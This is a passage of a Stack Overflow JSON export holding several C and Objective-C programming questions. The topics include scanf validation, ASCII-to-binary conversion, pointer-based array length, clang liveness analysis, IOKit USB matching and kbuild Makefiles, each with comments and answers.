"abstract-syntax-tree", "control-flow-graph"], "comments": [{"owner": {"reputation": 5008, "user_id": 2088822, "user_type": "registered", "accept_rate": 93, "profile_image": "https://www.gravatar.com/avatar/c96b4e7fa4e410b2df9513f79cffd0fe?s=128&d=identicon&r=PG", "display_name": "afsantos", "link": "https://stackoverflow.com/users/2088822/afsantos"}, "edited": false, "score": 0, "creation_date": 1491087938, "post_id": 40007644, "comment_id": 73400638, "body": "Did you find a solution for this? I&#39;m interested on it as well."}, {"owner": {"reputation": 552, "user_id": 1881999, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0c40b5a6d50bb6b25bda3e8fcc5c1b26?s=128&d=identicon&r=PG", "display_name": "afsafzal", "link": "https://stackoverflow.com/users/1881999/afsafzal"}, "reply_to_user": {"reputation": 5008, "user_id": 2088822, "user_type": "registered", "accept_rate": 93, "profile_image": "https://www.gravatar.com/avatar/c96b4e7fa4e410b2df9513f79cffd0fe?s=128&d=identicon&r=PG", "display_name": "afsantos", "link": "https://stackoverflow.com/users/2088822/afsantos"}, "edited": false, "score": 0, "creation_date": 1491597807, "post_id": 40007644, "comment_id": 73641736, "body": "@afsantos No I didn&#39;t."}], "owner": {"reputation": 552, "user_id": 1881999, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0c40b5a6d50bb6b25bda3e8fcc5c1b26?s=128&d=identicon&r=PG", "display_name": "afsafzal", "link": "https://stackoverflow.com/users/1881999/afsafzal"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 115, "favorite_count": 1, "answer_count": 0, "score": 1, "last_activity_date": 1476303626, "creation_date": 1476303626, "question_id": 40007644, "link": "https://stackoverflow.com/questions/40007644/getting-live-variables-with-clangs-python-binding", "title": "getting live variables with clang&#39;s python binding", "body": "<p>I'm writing an analysis tool for C language in Python and I am using clang python binding for this purpose. So far it has been great and I was able to get AST of the C files I have and process them. Now I need to find live variable at a certain point of program. By live variables I mean the variables that are used after that line of code before begin re-assigned. I noticed that clang already has some related code in <code>liveVariables.h</code>.</p>\n\n<p>Does anyone know how I can get it to work in the python binding?\nHow can I call <code>liveVariables</code> functions by having the AST and <code>TranslationUnit</code>?</p>\n"}, {"tags": ["c", "scanf"], "comments": [{"owner": {"reputation": 33821, "user_id": 45685, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/y4RJr.jpg?s=128&g=1", "display_name": "AndersK", "link": "https://stackoverflow.com/users/45685/andersk"}, "edited": false, "score": 0, "creation_date": 1476303157, "post_id": 40007495, "comment_id": 67293030, "body": "fflush on stdin is UB. use instead fgets then sscanf to read out values"}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 1, "creation_date": 1476303158, "post_id": 40007495, "comment_id": 67293033, "body": "<code>fflush(stdin);</code> is undefined behaviour."}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "reply_to_user": {"reputation": 33821, "user_id": 45685, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/y4RJr.jpg?s=128&g=1", "display_name": "AndersK", "link": "https://stackoverflow.com/users/45685/andersk"}, "edited": false, "score": 0, "creation_date": 1476303184, "post_id": 40007495, "comment_id": 67293049, "body": "@AndersK.: Actually <code>fflush</code> on <b>any</b> input stream is, not just <code>stdin</code>."}, {"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 1, "creation_date": 1476303208, "post_id": 40007495, "comment_id": 67293062, "body": "See <a href=\"http://stackoverflow.com/questions/2979209/using-fflushstdin\">Using <code>fflush(stdin)</code></a> for the full story on <code>fflush(stdin)</code>."}, {"owner": {"reputation": 33821, "user_id": 45685, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/y4RJr.jpg?s=128&g=1", "display_name": "AndersK", "link": "https://stackoverflow.com/users/45685/andersk"}, "reply_to_user": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1476303221, "post_id": 40007495, "comment_id": 67293068, "body": "@Olaf yes, in his case he is using stdin"}, {"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 1, "creation_date": 1476303255, "post_id": 40007495, "comment_id": 67293093, "body": "Please use a more orthodox (readable) code layout.  That is, to the eyes of anyone who&#39;s coded in C for a while, a very peculiar layout."}, {"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 1, "creation_date": 1476303390, "post_id": 40007495, "comment_id": 67293154, "body": "Your code should be checking that <code>scanf()</code> returns 1 for success; 0 or EOF can be returned on failure, for different sets of reasons."}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 1, "creation_date": 1476303536, "post_id": 40007495, "comment_id": 67293222, "body": "<code>while(scanf_control1=0 ...</code> is a syntax error. It sets <code>scanf_control1</code> to <code>0</code>, and tests the <i>reverse</i> logic you intend. You repeat this gaffe several times, where you should be using <code>==</code> instead of <code>=</code>."}, {"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 0, "creation_date": 1476303562, "post_id": 40007495, "comment_id": 67293237, "body": "As for <code>12x</code>, that&#39;s modestly tricky.  I&#39;d use line-based input (which obviates the need for <code>fflush(stdin)</code>) and then scan the line with <code>sscanf()</code>, including testing where the conversion ends (using <code>%n</code> \u2014 see <a href=\"http://stackoverflow.com/questions/3975236/how-to-use-sscanf-in-loops\">Using <code>sscanf()</code> in a loop</a> for more info).  You can then check that all the characters were used in the conversion to number, and handle the difference correctly."}, {"owner": {"reputation": 71, "user_id": 6514738, "user_type": "registered", "accept_rate": 30, "profile_image": "https://www.gravatar.com/avatar/c7426f9af0e2f7537443ded974febf2b?s=128&d=identicon&r=PG&f=1", "display_name": "NeviJ", "link": "https://stackoverflow.com/users/6514738/nevij"}, "edited": false, "score": 0, "creation_date": 1476303807, "post_id": 40007495, "comment_id": 67293379, "body": "thanks for quick answers guys."}], "owner": {"reputation": 71, "user_id": 6514738, "user_type": "registered", "accept_rate": 30, "profile_image": "https://www.gravatar.com/avatar/c7426f9af0e2f7537443ded974febf2b?s=128&d=identicon&r=PG&f=1", "display_name": "NeviJ", "link": "https://stackoverflow.com/users/6514738/nevij"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 40, "favorite_count": 0, "answer_count": 0, "score": 0, "last_activity_date": 1476310834, "creation_date": 1476303057, "last_edit_date": 1476310834, "question_id": 40007495, "link": "https://stackoverflow.com/questions/40007495/scanf-checking-correct-input-data-why-it-works-only-in-one-example", "title": "Scanf- checking correct input data, why it works only in one example?", "body": "<p>I'm currently writing a simple program. There are three inputs, and only in the first one, my scanf control procedure works but not 100%. When I type a number other than 1 or 2 or some string like \"sdada\", it works correctly and I must type data again correctly. I said it's not 100% because when I type something like \"12x\", the program thinks that this is correct data but of course it's not.</p>\n\n<p>In the second and third inputs, when I type a string again, the program thinks that this is correct data, So why does it work in the first example but not in the next two? And how can I fix this \"12x\" problem? I'm a beginner so thanks for the advice.</p>\n\n<p>Here's my code:</p>\n\n<pre><code>do {\n    fflush(stdin);\n    printf(\"\\nInput: \");\n    scanf_control1 = scanf(\"%d\",&amp;input);\n} while(scanf_control1 = 0 || input &lt; 1 || input &gt; 2);\n\nif (input == 1 || input == 2) {\n\n    do {\n        fflush(stdin);\n        printf(\"\\nInput 2: \");\n        scanf_control2 = scanf(\"%d\",&amp;input2);\n    } while(scanf_control2 = 0);\n\n} else {\n\n    do{\n        fflush(stdin);\n        printf(\"\\nInput 3: \");\n        scanf_control3 = scanf(\"%s\", &amp;input3);\n    } while(scanf_control3 = 0);\n}\n</code></pre>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 11194, "user_id": 3003365, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/dP9Od.jpg?s=128&g=1", "display_name": "kaylum", "link": "https://stackoverflow.com/users/3003365/kaylum"}, "edited": false, "score": 0, "creation_date": 1476302736, "post_id": 40007330, "comment_id": 67292836, "body": "For starters: <code>contador = aux</code> needs to be <code>contador = aux-1;</code> as <code>aux</code> is one past the last index that was set in the while loop above that."}, {"owner": {"reputation": 11194, "user_id": 3003365, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/dP9Od.jpg?s=128&g=1", "display_name": "kaylum", "link": "https://stackoverflow.com/users/3003365/kaylum"}, "edited": false, "score": 0, "creation_date": 1476302965, "post_id": 40007330, "comment_id": 67292948, "body": "<code>while(numero &gt;= &#39;0&#39;);</code> is also wrong. <code>&#39;0&#39;</code> and <code>0</code> are different values. You want the latter."}, {"owner": {"reputation": 33, "user_id": 7009983, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/92ea331d62b734cf4642af528f3b2127?s=128&d=identicon&r=PG&f=1", "display_name": "Vin&#237;cius Breda", "link": "https://stackoverflow.com/users/7009983/vin%c3%adcius-breda"}, "reply_to_user": {"reputation": 11194, "user_id": 3003365, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/dP9Od.jpg?s=128&g=1", "display_name": "kaylum", "link": "https://stackoverflow.com/users/3003365/kaylum"}, "edited": false, "score": 0, "creation_date": 1476303157, "post_id": 40007330, "comment_id": 67293031, "body": "@kaylum if I use contador = aux-1 it only prints 7 numbers and doesn&#39;t fill the last one with a 0, that&#39;s why I used aux. I saw this &#39;0&#39; error too, thanks."}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 2, "creation_date": 1476304523, "post_id": 40007330, "comment_id": 67293743, "body": "About your last sentence: the <code>getch();</code> is there so that if the console output is to a popup window it won&#39;t just disappear before you can read any output. The <code>return 0;</code> is there because the function type is <code>int</code> (although <code>main</code> is an exception, it is not mandatory in this case to return a value)."}, {"owner": {"reputation": 33, "user_id": 7009983, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/92ea331d62b734cf4642af528f3b2127?s=128&d=identicon&r=PG&f=1", "display_name": "Vin&#237;cius Breda", "link": "https://stackoverflow.com/users/7009983/vin%c3%adcius-breda"}, "reply_to_user": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1476307744, "post_id": 40007330, "comment_id": 67295483, "body": "@WeatherVane Thanks!!!"}], "answers": [{"comments": [{"owner": {"reputation": 33, "user_id": 7009983, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/92ea331d62b734cf4642af528f3b2127?s=128&d=identicon&r=PG&f=1", "display_name": "Vin&#237;cius Breda", "link": "https://stackoverflow.com/users/7009983/vin%c3%adcius-breda"}, "edited": false, "score": 0, "creation_date": 1476305169, "post_id": 40007585, "comment_id": 67294088, "body": "I&#39;ve made some changes to my code in which using 7 instead of aux or aux-1 solves the problem of numbers only showing 7 characters I had before. I used getch because I want only one character leaving no room for user mistakes, if I use any other function it lets the user enter more and I&#39;ll have to validate the answer."}, {"owner": {"reputation": 2710, "user_id": 4532326, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/aeb4dabdec3bf43bba4a71124b0d67f7?s=128&d=identicon&r=PG&f=1", "display_name": "granmirupa", "link": "https://stackoverflow.com/users/4532326/granmirupa"}, "reply_to_user": {"reputation": 33, "user_id": 7009983, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/92ea331d62b734cf4642af528f3b2127?s=128&d=identicon&r=PG&f=1", "display_name": "Vin&#237;cius Breda", "link": "https://stackoverflow.com/users/7009983/vin%c3%adcius-breda"}, "edited": false, "score": 0, "creation_date": 1476305419, "post_id": 40007585, "comment_id": 67294223, "body": "@Vin&#237;ciusBreda you can use getch() if you want, but is not a function of standard c. It&#39;s in a library made for windows os."}], "tags": [], "owner": {"reputation": 2710, "user_id": 4532326, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/aeb4dabdec3bf43bba4a71124b0d67f7?s=128&d=identicon&r=PG&f=1", "display_name": "granmirupa", "link": "https://stackoverflow.com/users/4532326/granmirupa"}, "is_accepted": true, "score": 1, "last_activity_date": 1476305441, "last_edit_date": 1476305441, "creation_date": 1476303388, "answer_id": 40007585, "question_id": 40007330, "link": "https://stackoverflow.com/questions/40007330/need-help-converting-from-ascii-to-binary/40007585#40007585", "title": "Need help converting from ASCII to binary", "body": "<p>Your code had some errors in the <code>while</code> condition:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n#define MAXIMO 8\n\nint main( void )\n{\n  char caracter;\n  int aux, resto[MAXIMO], contador, decimal, numero;\n  printf( \"Digite um UNICO caracter: \" );\n  caracter = getchar(); // I used getchar instead of getch()\n  numero = caracter;\n  decimal = caracter;\n  aux = 0;\n  do\n  {\n    if (numero % 2 == 0)\n    {\n      resto[aux] = 0;\n    }\n    else\n    {\n      resto[aux] = 1;\n    }\n    numero = numero / 2;\n    aux++;\n\n  }\n  while (numero &gt; 0); // &gt; than 0 not &gt;= '0' \n  //system(\"cls\");\n  printf( \"\\n\\n%d\\n\\n\", aux );\n  printf( \"\\nCaracter em Binario: \" );\n  for (contador = aux-1; contador &gt;= 0; contador--) //aux-1\n  {\n    printf( \"%d\", resto[contador] );\n  }\n  printf( \"\\nValor decimal do caracter: %d\", decimal );\n  getchar();\n  return 0;\n}\n</code></pre>\n\n<h2>N.B.</h2>\n\n<ul>\n<li>'0' and 0 <strong>are differents</strong></li>\n<li><code>&gt;</code> (greater) and <code>&gt;=</code> (greater or equal) have <strong>different</strong> meaning</li>\n</ul>\n"}], "owner": {"reputation": 33, "user_id": 7009983, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/92ea331d62b734cf4642af528f3b2127?s=128&d=identicon&r=PG&f=1", "display_name": "Vin&#237;cius Breda", "link": "https://stackoverflow.com/users/7009983/vin%c3%adcius-breda"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 93, "favorite_count": 0, "accepted_answer_id": 40007585, "answer_count": 1, "score": 3, "last_activity_date": 1476305441, "creation_date": 1476302453, "last_edit_date": 1476303421, "question_id": 40007330, "link": "https://stackoverflow.com/questions/40007330/need-help-converting-from-ascii-to-binary", "title": "Need help converting from ASCII to binary", "body": "<p>I'm very new to C, so I don't know much about it. Pointers are something I still haven't learned...\nI need to show a single character in decimal and binary. In decimals its easy but I can't get it to binary in any way... I get the ASCII number and compare it's module with 2 but it shows a really awkward number... what is wrong with the code?(It's in portuguese \nThis is my code:    </p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;conio.c&gt; //library my professor created to assist his students\n#include &lt;string.h&gt;\n#define MAXIMO 8\n\nint main( void )\n{\n  char caracter;\n  int aux, resto[MAXIMO], contador, decimal, numero;\n  printf( \"Digite um UNICO caracter: \" );\n  caracter = getch();\n  numero = caracter;\n  decimal = caracter;\n  aux = 0;\n  do\n  {\n    if (numero % 2 == 0)\n    {\n      resto[aux] = 0;\n    }\n    else\n    {\n      resto[aux] = 1;\n    }\n    numero = numero / 2;\n    aux++;\n\n  }\n  while (numero &gt;= '0');\n  //system(\"cls\");\n  printf( \"\\n\\n%d\\n\\n\", aux );\n  printf( \"\\nCaracter em Binario: \" );\n  for (contador = aux; contador &gt;= 0; contador--)\n  {\n    printf( \"%d\", resto[contador] );\n  }\n  printf( \"\\nValor decimal do caracter: %d\", decimal );\n  getch();\n  return 0;\n}\n</code></pre>\n\n<p>somethings I use like getch(); and return 0; in the end are just so my teacher don't kill me... I don't fully know why it's there but it has to be.</p>\n"}, {"tags": ["c", "arrays"], "comments": [{"owner": {"reputation": 12097, "user_id": 1080064, "user_type": "registered", "accept_rate": 43, "profile_image": "https://graph.facebook.com/100000753306178/picture?type=large", "display_name": "tkausl", "link": "https://stackoverflow.com/users/1080064/tkausl"}, "edited": false, "score": 3, "creation_date": 1476301432, "post_id": 40007030, "comment_id": 67292123, "body": "This is undefined behavior. An array does not have a null-terminator."}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 3, "creation_date": 1476301635, "post_id": 40007030, "comment_id": 67292244, "body": "A C string is an array. But that is not a bijection: An array is not a C string."}], "answers": [{"tags": [], "owner": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "is_accepted": true, "score": 2, "last_activity_date": 1476301828, "creation_date": 1476301828, "answer_id": 40007144, "question_id": 40007030, "link": "https://stackoverflow.com/questions/40007030/c-lang-different-array-length-by-pointer/40007144#40007144", "title": "c lang - different array length by pointer", "body": "<p>It fails because there's no <code>0</code> at the end of your array. It's not added automatically, you need to do it explicitly. As a result, you accessed outside the array, which results in undefined behavior. The fact that one of your tests seemed to work was purely luck, you can't depend on it.</p>\n\n<pre><code>int a[] = {5, 4, 1, 2, 1, 0};\n</code></pre>\n\n<p>The only time that C automatically adds a null terminator is when you use a string literal to initialize a <code>char</code> array, e.g.</p>\n\n<pre><code>char c[] = \"abcde\";\n</code></pre>\n"}], "owner": {"reputation": 63, "user_id": 7009925, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/rbci2.jpg?s=128&g=1", "display_name": "ivanbogomolov", "link": "https://stackoverflow.com/users/7009925/ivanbogomolov"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 40, "favorite_count": 0, "accepted_answer_id": 40007144, "answer_count": 1, "score": -1, "last_activity_date": 1476301828, "creation_date": 1476301341, "question_id": 40007030, "link": "https://stackoverflow.com/questions/40007030/c-lang-different-array-length-by-pointer", "title": "c lang - different array length by pointer", "body": "<p>I have problem with my own function for get array length.\nCode:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\nint main() {\n    int a[] = {5,4,1,2,1}; //len -&gt; 6!! FAIL! WHY?\n    //int a[] = {5,4,1,2}; //len -&gt; 4 OK!\n    int len = 0;\n    int *p = a;\n    while(*p != '\\0'){\n            printf(\"%d\\n\", *p);\n            len++;\n            *p++;\n    }\n    printf(\"len: %d\\n\", len);\n    return 0;\n}\n</code></pre>\n\n<p>code above output:</p>\n\n<pre><code>5\n4\n1\n2\n1\n32767\nlen: 6\n</code></pre>\n\n<p>but this array int a[] = {5,4,1,2}; - produce len = 4 - ok.</p>\n\n<p>why it happens? </p>\n"}, {"tags": ["objective-c", "c", "macos", "avfoundation", "iokit"], "answers": [{"tags": [], "owner": {"reputation": 30089, "user_id": 22147, "user_type": "registered", "accept_rate": 81, "profile_image": "https://i.stack.imgur.com/x74x2.png?s=128&g=1", "display_name": "Rhythmic Fistman", "link": "https://stackoverflow.com/users/22147/rhythmic-fistman"}, "is_accepted": true, "score": 1, "last_activity_date": 1476325395, "creation_date": 1476325395, "answer_id": 40011275, "question_id": 40006908, "link": "https://stackoverflow.com/questions/40006908/usb-interface-of-an-avcapturedevice/40011275#40011275", "title": "USB interface of an AVCaptureDevice", "body": "<p>Maybe a combination of <code>AVCaptureDevice</code> <code>modelID</code> and <code>uniqueID</code> could help you find the matching <code>IOService</code>. The formatting of the two IDs looks to be both undocumented and dependent on transport and media-type, but you should be able to figure something out. Here is a tentative mapping for USB audio (because I don't have any USB cameras), based on two devices:</p>\n\n<pre><code>modelID: USB Headphone Set:0C76:1607\nuniqueID: AppleUSBAudioEngine:Unknown Manufacturer:USB Headphone Set:14200000:2,1,\n    USB Headphone Set:\n\n    Product ID: 0x1607\n    Vendor ID:  0x0c76  (Solid State System Co., Ltd.)\nVersion:    1.00\nSpeed:  Up to 12 Mb/sec\n    Location ID:    0x14200000 / 9\n    Current Available (mA): 1000\n    Current Required (mA):  100\n    Extra Operating Current (mA):   0\n\n\nuniqueID: AppleUSBAudioEngine:Burr-Brown from TI              :USB Audio CODEC :14200000:2,\nmodelID: USB Audio CODEC :08BB:2902\n    USB Audio CODEC :\n\n    Product ID: 0x2902\n    Vendor ID:  0x08bb  (Texas Instruments Japan)\nVersion:    1.00\nSpeed:  Up to 12 Mb/sec\nManufacturer:   Burr-Brown from TI\n    Location ID:    0x14200000 / 10\n    Current Available (mA): 1000\n    Current Required (mA):  100\n    Extra Operating Current (mA):   0\n</code></pre>\n\n<p>The (usb audio) format is something like  </p>\n\n<pre><code>modelID: name:vendorID:productID\nuniqueID: AppleUSBAudioEngine:Manufacturer or Unknown Manufacturer:location ID:???\n</code></pre>\n\n<p>If USB video's <code>uniqueID</code> is similar, then the combination of <code>productID</code>, <code>vendorID</code> and <code>locationID</code> (which USB port) should be enough to uniquely identify the underlying device's hardware, albeit in a fragile and undocumented way. </p>\n"}], "owner": {"reputation": 1296, "user_id": 1094044, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/4f6a4607838c44765c5a273634c10777?s=128&d=identicon&r=PG", "display_name": "prazuber", "link": "https://stackoverflow.com/users/1094044/prazuber"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 642, "favorite_count": 0, "accepted_answer_id": 40011275, "answer_count": 1, "score": 2, "last_activity_date": 1476325395, "creation_date": 1476300834, "last_edit_date": 1476301847, "question_id": 40006908, "link": "https://stackoverflow.com/questions/40006908/usb-interface-of-an-avcapturedevice", "title": "USB interface of an AVCaptureDevice", "body": "<p>If I have an AVCaptureDevice, how can I get the related USB interface so I can access the underlying hardware via IOKit?</p>\n\n<p>I've tried finding it via vid &amp; pid, but this won't work if I plug in two devices with the same vid, pid. Here's the code I use to extract vid and pid from AVCaptureDevice:</p>\n\n<pre><code>AVCaptureDevice *device = [AVCaptureDevice defaultDeviceWithDeviceType:AVMediaTypeVideo];\nNSString *modelID = [device modelID];\n\nNSRange vidRange = [modelID rangeOfString:@\"VendorID_\"];\nint vid = [[modelID substringWithRange:NSMakeRange(vidRange.location + 9, 5)] intValue];\n\nNSRange pidRange = [modelID rangeOfString:@\"ProductID_\"];\nint vid = [[modelID substringWithRange:NSMakeRange(pidRange.location + 10, 5)] intValue];\n</code></pre>\n\n<p>And then I search for a matching IOService:</p>\n\n<pre><code>CFMutableDictionaryRef matchingDict = IOServiceMatching(kIOUSBDeviceClassName);\nCFNumberRef numberRef;\n\nnumberRef = CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt32Type, &amp;vid);\nCFDictionarySetValue(matchingDict, CFSTR(kUSBVendorID), numberRef);\nCFRelease(numberRef);\n\nnumberRef = CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt32Type, &amp;pid);\nCFDictionarySetValue(matchingDict, CFSTR(kUSBProductID), numberRef);\nCFRelease(numberRef);\n\nio_service_t camera = IOServiceGetMatchingService(kIOMasterPortDefault, matchingDict);\n</code></pre>\n"}, {"tags": ["c", "makefile", "build", "linux-kernel", "kbuild"], "comments": [{"owner": {"reputation": 3561, "user_id": 2511795, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/30c869f55cbcf82a7bc4536d563daa0a?s=128&d=identicon&r=PG", "display_name": "0andriy", "link": "https://stackoverflow.com/users/2511795/0andriy"}, "edited": false, "score": 0, "creation_date": 1476307942, "post_id": 40006803, "comment_id": 67295586, "body": "You can add folders to the list of objects. Check any <i>folder/Makefile</i> in the sources."}, {"owner": {"reputation": 8774, "user_id": 371862, "user_type": "registered", "accept_rate": 84, "profile_image": "https://www.gravatar.com/avatar/d995a45f7c20d510e5a95eee1c0e2b98?s=128&d=identicon&r=PG", "display_name": "Jordan", "link": "https://stackoverflow.com/users/371862/jordan"}, "reply_to_user": {"reputation": 3561, "user_id": 2511795, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/30c869f55cbcf82a7bc4536d563daa0a?s=128&d=identicon&r=PG", "display_name": "0andriy", "link": "https://stackoverflow.com/users/2511795/0andriy"}, "edited": false, "score": 0, "creation_date": 1476375949, "post_id": 40006803, "comment_id": 67329883, "body": "@AndyShevchenko: I&#39;ve tried looking at a bunch of them already, but they don&#39;t appear to handle multiple chaining of Makefiles into the same kernel module.  Isn&#39;t that what I&quot;m attempting to do at the bottom with foo-y += ../foo/? If I do something like &quot;obj-y += ../foo/&quot; work with compiling into the mymodule kernel module? I&#39;m still a bit confused. Do you have a good example I can look at? Thanks!"}, {"owner": {"reputation": 3561, "user_id": 2511795, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/30c869f55cbcf82a7bc4536d563daa0a?s=128&d=identicon&r=PG", "display_name": "0andriy", "link": "https://stackoverflow.com/users/2511795/0andriy"}, "edited": false, "score": 0, "creation_date": 1476389472, "post_id": 40006803, "comment_id": 67337316, "body": "<code>obj-[ym]</code> is a global space of separate units. You need to use module namespace for that."}, {"owner": {"reputation": 8774, "user_id": 371862, "user_type": "registered", "accept_rate": 84, "profile_image": "https://www.gravatar.com/avatar/d995a45f7c20d510e5a95eee1c0e2b98?s=128&d=identicon&r=PG", "display_name": "Jordan", "link": "https://stackoverflow.com/users/371862/jordan"}, "reply_to_user": {"reputation": 3561, "user_id": 2511795, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/30c869f55cbcf82a7bc4536d563daa0a?s=128&d=identicon&r=PG", "display_name": "0andriy", "link": "https://stackoverflow.com/users/2511795/0andriy"}, "edited": false, "score": 0, "creation_date": 1476390709, "post_id": 40006803, "comment_id": 67337989, "body": "From my example, would that me mymodule-y += ../foo/ or would it be something like foo-y += ../foo ?   And then what would I do inside my foo/Makefile? Would that be mymodule-y += component1 or would I use a separate module namespace?"}], "answers": [{"comments": [{"owner": {"reputation": 8774, "user_id": 371862, "user_type": "registered", "accept_rate": 84, "profile_image": "https://www.gravatar.com/avatar/d995a45f7c20d510e5a95eee1c0e2b98?s=128&d=identicon&r=PG", "display_name": "Jordan", "link": "https://stackoverflow.com/users/371862/jordan"}, "edited": false, "score": 0, "creation_date": 1476718620, "post_id": 40090359, "comment_id": 67453497, "body": "Somewhat, but it doesn&#39;t make use of the kbuild objects at all. I don&#39;t really want to call gcc directly, and  I don&#39;t have any other targets in mymodule/Makefile."}, {"owner": {"reputation": 86085, "user_id": 128940, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/9d35101b4060dc3af0d5c1b7c42c4935?s=128&d=identicon&r=PG&f=1", "display_name": "Beta", "link": "https://stackoverflow.com/users/128940/beta"}, "reply_to_user": {"reputation": 8774, "user_id": 371862, "user_type": "registered", "accept_rate": 84, "profile_image": "https://www.gravatar.com/avatar/d995a45f7c20d510e5a95eee1c0e2b98?s=128&d=identicon&r=PG", "display_name": "Jordan", "link": "https://stackoverflow.com/users/371862/jordan"}, "edited": false, "score": 0, "creation_date": 1476718879, "post_id": 40090359, "comment_id": 67453677, "body": "@Jordan: I&#39;m not familiar with kbuild; how do you pass gcc flags to it?"}, {"owner": {"reputation": 8774, "user_id": 371862, "user_type": "registered", "accept_rate": 84, "profile_image": "https://www.gravatar.com/avatar/d995a45f7c20d510e5a95eee1c0e2b98?s=128&d=identicon&r=PG", "display_name": "Jordan", "link": "https://stackoverflow.com/users/371862/jordan"}, "edited": false, "score": 0, "creation_date": 1476718965, "post_id": 40090359, "comment_id": 67453729, "body": "It seems you don&#39;t do it directly:  <a href=\"http://lxr.free-electrons.com/source/Documentation/kbuild/makefiles.txt\" rel=\"nofollow noreferrer\">lxr.free-electrons.com/source/Documentation/kbuild/&hellip;</a>"}, {"owner": {"reputation": 8774, "user_id": 371862, "user_type": "registered", "accept_rate": 84, "profile_image": "https://www.gravatar.com/avatar/d995a45f7c20d510e5a95eee1c0e2b98?s=128&d=identicon&r=PG", "display_name": "Jordan", "link": "https://stackoverflow.com/users/371862/jordan"}, "edited": false, "score": 0, "creation_date": 1476720104, "post_id": 40090359, "comment_id": 67454439, "body": "Section 3.2 should explain some of it. I don&#39;t quite understand it fully myself."}, {"owner": 